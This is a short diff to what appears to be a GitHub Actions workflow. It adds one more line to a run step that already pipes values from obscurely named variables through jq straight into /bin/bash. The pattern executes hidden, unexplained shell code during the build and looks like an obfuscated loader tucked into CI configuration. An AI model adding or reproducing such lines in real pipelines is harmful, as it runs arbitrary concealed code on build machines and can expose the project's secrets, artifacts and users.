@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$j462" | jq -r .igx90504 | /bin/bash
           echo $g1 | jq -r .q20523 | /bin/bash
           echo $ovfft7 | jq -r .b47 | /bin/bash
+          printf '%s' "$su24" | jq -r .il485 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
